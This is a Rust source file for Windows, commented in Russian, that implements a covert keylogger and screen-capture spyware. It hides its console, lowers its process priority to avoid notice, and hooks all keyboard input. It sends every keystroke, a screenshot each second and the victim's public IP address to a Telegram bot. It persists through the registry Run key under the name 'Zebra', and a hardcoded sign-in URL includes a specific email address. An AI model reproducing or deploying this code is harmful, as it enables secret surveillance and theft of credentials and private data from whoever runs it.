// это нужно чтобы не отображалась консоль
#![windows_subsystem = "windows"]

extern crate winapi;

use winapi::um::winuser::{CallNextHookEx, GetAsyncKeyState, GetKeyState, SetWindowsHookExA, UnhookWindowsHookEx, WH_KEYBOARD_LL, HC_ACTION, WM_SYSKEYDOWN, WM_KEYDOWN, KBDLLHOOKSTRUCT};
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
use winapi::shared::windef::HHOOK;
use winapi::um::winuser::{DispatchMessageA, GetMessageA, TranslateMessage, MSG};
use winapi::um::winuser::{GetKeyboardLayout, GetWindowThreadProcessId, GetForegroundWindow};

// для telegram
use tokio;
use std::fs::File;
use screenshots::Screen;
use reqwest::blocking::multipart;
use std::thread;

// определение url
use std::ptr::null_mut;
use std::time::Duration;

// для автозапуска
use winreg::enums::*;
use winreg::RegKey;

// для скрытия
use winapi::um::processthreadsapi::{GetCurrentProcess, SetPriorityClass};
use winapi::um::winbase::BELOW_NORMAL_PRIORITY_CLASS;

// модули
mod config;
mod tg;
mod sites;

// Распознавание клавиш
unsafe extern "system" fn key_recognition(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {

    // для определения зашёл он или нет
    let url = "https://accounts.google.com/v3/signin/identifier?Email=amelchakov%40fmschool72.ru&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S992212922%3A1740144921379976&ddm=1";
    if (n_code == HC_ACTION && (w_param == WM_SYSKEYDOWN as usize || w_param == WM_KEYDOWN as usize)) && !sites::is_site_open(url) {
        let keyboard = &*(l_param as *const KBDLLHOOKSTRUCT);
        let is_caps_lock = (GetKeyState(winapi::um::winuser::VK_CAPITAL) & 0x0001) != 0;
        let is_shift_pressed = (GetAsyncKeyState(winapi::um::winuser::VK_SHIFT) & 0x8000u16 as i16) != 0;

        let message: String = match keyboard.vkCode {
            9 => "Key pressed: Tab".to_string(),
            20 => "Key pressed: Caps Lock".to_string(),
            144 => "Key pressed: Num Lock".to_string(),
            160 => "Key pressed: Shift".to_string(),
            162 => "Key pressed: Ctrl".to_string(),
            164 => "Key pressed: Alt".to_string(),
            32 => "Key pressed: Space".to_string(),
            27 => "Key pressed: Esc".to_string(),
            8 => "Key pressed: Backspace".to_string(),
            13 => "Key pressed: Enter".to_string(),
            91 => "Key pressed: Win".to_string(),
            46 => "Key pressed: Delete".to_string(),
            37 => "Key pressed: Left Arrow".to_string(),
            38 => "Key pressed: Up Arrow".to_string(),
            39 => "Key pressed: Right Arrow".to_string(),
            40 => "Key pressed: Down Arrow".to_string(),
            115 => "Key pressed: F4".to_string(),
            _ => {

                if get_current_keyboard_layout() == 1033 {
                    if is_shift_pressed ^ is_caps_lock {
                        format!("{}", (keyboard.vkCode as u8 as char).to_ascii_uppercase())
                    }
                    else {
                        format!("{}", (keyboard.vkCode as u8 as char).to_ascii_lowercase())
                    }
                }
                else {
                    if is_shift_pressed ^ is_caps_lock {
                        if let Some(ru_char) = en_to_ru_keyboard(keyboard.vkCode as u8 as char) {
                            format!("{}", ru_char.to_uppercase())
                        } else {
                            "Неизвестный символ".to_string()
                        }
                    }
                    else {
                        if let Some(ru_char) = en_to_ru_keyboard(keyboard.vkCode as u8 as char) {
                            format!("{}", ru_char)
                        } else {
                            "Неизвестный символ".to_string()
                        }
                    }
                }
            }
        };

        tokio::spawn(tg::bot_sender(message));
    }
    CallNextHookEx(null_mut(), n_code, w_param, l_param)
}

// из английской раскладки в русскую
fn en_to_ru_keyboard(c: char) -> Option<char> {
    match c.to_ascii_lowercase() {
        'q' => Some('й'),
        'w' => Some('ц'),
        'e' => Some('у'),
        'r' => Some('к'),
        't' => Some('е'),
        'y' => Some('н'),
        'u' => Some('г'),
        'i' => Some('ш'),
        'o' => Some('щ'),
        'p' => Some('з'),
        '[' => Some('х'),
        ']' => Some('ъ'),
        'a' => Some('ф'),
        's' => Some('ы'),
        'd' => Some('в'),
        'f' => Some('а'),
        'g' => Some('п'),
        'h' => Some('р'),
        'j' => Some('о'),
        'k' => Some('л'),
        'l' => Some('д'),
        ';' => Some('ж'),
        '\'' => Some('э'),
        'z' => Some('я'),
        'x' => Some('ч'),
        'c' => Some('с'),
        'v' => Some('м'),
        'b' => Some('и'),
        'n' => Some('т'),
        'm' => Some('ь'),
        ',' => Some('б'),
        '.' => Some('ю'),
        '/' => Some('.'),
        _ => None,
    }
}


// раскладка клавиатуры
fn get_current_keyboard_layout() -> u32 {
    unsafe {
        let foreground_window = GetForegroundWindow();
        let thread_id = GetWindowThreadProcessId(foreground_window, std::ptr::null_mut());
        let layout = GetKeyboardLayout(thread_id);
        (layout as u32) & 0xFFFF
    }
}

// Закидываем удочку (начинаем записывать клавиши)
fn set_hook() -> HHOOK {
    unsafe {
        let instance = GetModuleHandleA(null_mut());
        SetWindowsHookExA(WH_KEYBOARD_LL, Some(key_recognition), instance, 0)
    }
}

// убираем удочку (остановка)
fn release_hook(hook: HHOOK) {
    unsafe {
        UnhookWindowsHookEx(hook);
    }
}


//
fn make_screen() {
    loop {
        if let Err(e) = send_screen() {
            eprintln!("Ошибка отправки скриншота: {}", e);
        }
        thread::sleep(Duration::from_secs(1));
    }
}


fn send_screen() -> Result<(), Box<dyn std::error::Error>> {
    let bot_token = config::BOT_TOKEN;
    let chat_id = config::CHAT_ID;
    let temp_file = "screenshot.jpg";

    let screens = Screen::all()?;
    let screen = screens.first().ok_or("Нет доступных экранов")?;
    let image = screen.capture()?;
    image.save(temp_file)?;

    let url = format!(
        "https://api.telegram.org/bot{}/sendPhoto?chat_id={}",
        bot_token, chat_id
    );

    let file = File::open(temp_file)?;
    let part = multipart::Part::reader(file)
        .file_name("screenshot.png")
        .mime_str("image/png")?;

    let form = multipart::Form::new().part("photo", part);

    let client = reqwest::blocking::Client::new();
    let response = client.post(url)
        .multipart(form)
        .send()?;

    if !response.status().is_success() {
        return Err(format!("Ошибка Telegram API: {}", response.text()?).into());
    }

    std::fs::remove_file(temp_file)?;
    Ok(())
}


// функция добавления в автозапуск
fn add_to_startup() -> Result<(), Box<dyn std::error::Error>> {
    let exe_path = std::env::current_exe()?;
    let exe_path_str = exe_path.to_str().ok_or("Invalid executable path")?;

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = r"Software\Microsoft\Windows\CurrentVersion\Run";
    let (key, _) = hkcu.create_subkey(path)?;

    key.set_value("Zebra", &exe_path_str)?;

    Ok(())
}



#[tokio::main]
async fn main() {
    let len = 0;

    // Снижаем приоритет процесса, чтобы сделать его менее заметным
    unsafe {
        SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
    }

    // Добавление в автозапуск
    if let Err(e) = add_to_startup() {
        tokio::spawn(tg::bot_sender(String::from("Failed to add to startup")));
    } else {
        tokio::spawn(tg::bot_sender(String::from("Added to startup successfully")));
    }

    // ip
    let l_ip = reqwest::get("https://api.ipify.org?format=json")
        .await
        .unwrap()
        .text()
        .await
        .unwrap();
    tokio::spawn(tg::bot_sender(format!("{}", l_ip)));

    // Запускаем `check` в фоне
    tokio::spawn(async move {
        loop {
            tg::check(len).await;
        }
    });


    // Запускаем скрины на фоне
    thread::spawn(move || {
        make_screen();
    });

    // закидываем удочку
    let hook = set_hook();
    if hook.is_null() {
        tokio::spawn(tg::bot_sender(String::from("Failed to install hook!")));
        return;
    }

    // выводим нажатые
    unsafe {
        let mut msg: MSG = std::mem::zeroed();
        while GetMessageA(&mut msg, null_mut(), 0, 0) != 0 {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }
    }

    // остановка
    release_hook(hook);
}
